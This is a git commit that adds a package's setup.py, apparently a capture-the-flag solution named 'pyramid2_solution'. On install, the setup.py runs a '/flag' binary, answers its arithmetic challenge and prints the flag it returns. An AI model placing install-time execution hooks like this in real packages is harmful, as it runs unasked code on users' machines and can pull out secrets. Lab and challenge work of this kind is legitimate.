25bb049494428d6ae66c9794647df97a9d1760cb
Bot <41898282+github-actions[bot]@users.noreply.github.com>
2024-12-07 00:07:26 +0000

    Add package pyramid2-solution/0.0.5/pyramid2_solution-0.0.5.tar.gz

---
+++ packages/pyramid2-solution/pyramid2_solution-0.0.5.tar.gz/pyramid2_solution-0.0.5/setup.py
@@ -0,0 +1,31 @@
+# setup.py
+from setuptools import setup
+import subprocess
+import re
+
+def get_flag():
+    try:
+        proc = subprocess.Popen(['/flag'], stdin=subprocess.PIPE, stdout=subprocess.PIPE, text=True)
+        question = proc.stdout.readline()
+        print(question)
+        numbers = list(map(int, re.findall(r'\d+', question)))
+        if len(numbers) == 3:
+            A, B, C = numbers
+            answer = A * B + C
+            proc.stdin.write(f'{answer}\n')
+            proc.stdin.flush()
+            flag = proc.stdout.readline()
+            print(flag)
+        else:
+            print('Failed to parse question')
+    except FileNotFoundError:
+        print("The '/flag' binary was not found. Please ensure it is available.")
+
+# Call get_flag() at the top level
+get_flag()
+
+setup(
+    name='pyramid2_solution',
+    version='0.0.5',  # Incremented version
+    packages=['pyramid2_solution'],
+)
